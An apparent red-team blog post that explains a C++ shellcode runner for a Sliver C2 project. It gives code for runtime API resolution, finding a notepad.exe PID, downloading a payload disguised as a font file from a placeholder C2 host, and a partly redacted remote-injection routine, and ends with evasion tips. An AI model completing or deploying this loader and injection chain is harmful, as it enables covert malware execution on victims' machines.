---
title: "Shellcode Runner C++, basics"
date: 2026-01-10
layout: post
project: "Sliver C2 & Fileless Malware"
---

## Introduction

Hey everyone,

I want to start this post by making one thing very clear: I’m not going to show how to build a fully functional shellcode runner. The goal here is to walk you through the methods I used to create mine, along with a few C++ examples demonstrating how to apply these techniques.


## System Call Obfuscation

System Call Obfuscation, also known as D/Invoke in C#, is a method that can be widely used to call Windows functions at runtime, it is a technique that can be implemented at any stage of a malware's execution that uses Windows API functions.

Below is an example of this technique applied to the CreateToolhelp32Snapshot function, mainly used in Process Injection techniques.

`C++`
```cpp

// CreateToolhelp32Snapshot
typedef HANDLE(WINAPI* myToolSnapshot)(DWORD, DWORD);

HMODULE kernel32dll = LoadLibraryA("kernel32.dll");

myToolSnapshot My_Snapshot = (myToolSnapshot)GetProcAddress(kernel32dll, (LPCSTR)"CreateToolhelp32Snapshot");

My_Snapshot(TH32CS_SNAPPROCESS, 0)

```
### What this is doing

- **`typedef ... myToolSnapshot`**  
  Defines a *function pointer type* that matches the original `CreateToolhelp32Snapshot` signature.  
  This matters because when calling a function via pointer, the **parameter types** and **calling convention** (`WINAPI`) must match exactly.

- **`LoadLibraryA("kernel32.dll")`**  
  Loads `kernel32.dll` and returns a module handle (`HMODULE`). If the module is already loaded, Windows typically just increments its reference count.

- **`GetProcAddress(kernel32dll, "CreateToolhelp32Snapshot")`**  
  Resolves the **address** of `CreateToolhelp32Snapshot` at runtime and returns it as a raw pointer, which is then cast to `myToolSnapshot`.

- **`My_Snapshot(TH32CS_SNAPPROCESS, 0)`**  
  Requests a snapshot of the current process list. When using `TH32CS_SNAPPROCESS`, the second argument (`th32ProcessID`) is effectively **not used**, so passing `0` is standard in examples.

#### Reference
- [CreateToolhelp32Snapshot (Microsoft Docs)](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)


## Process Injection

The malware relies on process injection to write the shellcode into memory regions of another process, such as notepad.exe, svchost.exe, chrome.exe, etc.

First, we need to define a target process — for example, notepad.exe — and then use Windows APIs to find its PID. With the PID in hand, we can allocate memory inside that process.

### Searching for the PID !!!

You have defined notepad.exe as your target process, and the next step is to retrieve its Process ID (PID). To achieve this, the code uses CreateToolhelp32Snapshot, a Windows API function that captures a snapshot of all currently running processes on the system. Once the snapshot is created, it is traversed using Process32First and Process32Next, while _wcsicmp is used to perform a case-insensitive comparison of process names in order to identify the target executable.

`C++`
```cpp
DWORD GetNotepadPID() {
    DWORD pid = 0;

    // Create a snapshot of all running processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create process snapshot\n";
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32); // Must be set before calling Process32First

    // Retrieve the first process from the snapshot
    if (Process32First(hSnapshot, &pe)) {
        do {
            // Compare the executable name (case-insensitive)
            if (_wcsicmp(pe.szExeFile, L"notepad.exe") == 0) {
                pid = pe.th32ProcessID; // Store the process ID
                break;
            }
        } while (Process32Next(hSnapshot, &pe)); // Move to the next process
    } else {
        std::cerr << "Process32First failed\n";
    }

    // Always close the snapshot handle
    CloseHandle(hSnapshot);

    return pid;
}

int main() {
    DWORD pid = GetNotepadPID();

    if (pid != 0) {
        std::cout << "notepad.exe found! PID = " << pid << std::endl;
    } else {
        std::cout << "notepad.exe is not running.\n";
    }

    return 0;
}
```
This code leverages the Windows ToolHelp API to enumerate all running processes by creating a snapshot of the system’s current process state. Using Process32First, it retrieves the first process entry and then iterates through the remaining processes with Process32Next. During this iteration, the code performs a case-insensitive comparison of each process’s executable name against notepad.exe. This approach allows the program to systematically search through all active processes without prior knowledge of their order or quantity.

Once the target process is identified, the corresponding Process ID (PID) is extracted directly from the process entry structure and returned for later use. At no point does the code open or interact with the target process itself; it only reads metadata provided by the operating system. If notepad.exe is not running at the time the snapshot is taken, the function completes gracefully and indicates that no valid PID was found.

### Request for Shellcode


```cpp
#include <windows.h>
#include <wininet.h>
#include <cstdio>

BOOL Request(BYTE** outPayload, DWORD* outPayloadSize) {
    HINTERNET hInternet = InternetOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0
    );

    if (!hInternet) {
        return FALSE;
    }

    HINTERNET hFile = InternetOpenUrl(
        hInternet,
        L"https://domain.com:8443/fontawesome.woff",
        NULL,
        0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE,
        0
    );

    if (!hFile) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }
}
```
#### What this is doing

Once a remote resource is successfully opened, data must be read from the network stream. This is typically done using `InternetReadFile`, which operates in a stream-oriented manner and may return partial data on each call. Because of this behavior, the function is usually invoked repeatedly until no more bytes are available. If this logic is implemented correctly within your own codebase, it allows the application to successfully retrieve data from a remote command-and-control Server.

### Write and Execute!

At this stage, you already have the PID of the target process and the payload retrieved from the C2 server in memory. This concludes the preparation phase of the malware, as the next step is where the actual injection takes place. In the following phase, the payload is injected into the target process and executed, ultimately resulting in an active shell.

`C++`
```cpp
void ExecuteRemoteProcessExample(DWORD targetPid) {

    // 1. Obtain a handle to the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);

    // 2. Allocate memory inside the remote process
    // (In a real scenario, this would reserve executable memory)
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        /* payload size */,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // 3. Example payload (illustrative only)
    // This does NOT represent real shellcode
    BYTE examplePayload[] = { 0x90, 0x90, 0x90, 0xCC };

    // 4. Write data into the remote process memory
    // Actual memory copying logic is intentionally omitted
    WriteProcessMemory(
        hProcess,
        remoteBuffer,
        /* payload buffer */,
        /* payload size */,
        NULL
    );

    // 5. Create a remote thread in a suspended state
    HANDLE hThread = CreateRemoteThreadEx(
        hProcess,
        NULL,
        0,
        /* entry point */,
        NULL,
        CREATE_SUSPENDED,
        NULL
    );

    // 6. Resume execution
    ResumeThread(hThread);
}
```

#### What this is doing

The execution phase consists of opening a handle to the target process, allocating memory within its address space, and writing a payload into that memory region. Once the payload is placed, a remote thread is created to transfer execution flow to the injected code. While the APIs involved are publicly documented Windows functions, their correct and safe implementation requires careful memory management, synchronization, and error handling. For this reason, implementation details are intentionally abstracted in this article.

## Considerations and Conclusion

There are a few techniques you could implement in this shellcode runner to help with defense evasion—such as writing the payload in small chunks, adding short sleeps between stages, being careful with memory allocation permissions, and so on. But as I mentioned, in this article I only covered a few methods I used in my Shellcode Runner to execute this PoC. Depending on your needs, the sky’s the limit.

If you made it this far, thank you very much. The next step in this project is to observe the detection in a SOC environment—using the well-known open-source Wazuh. See you there.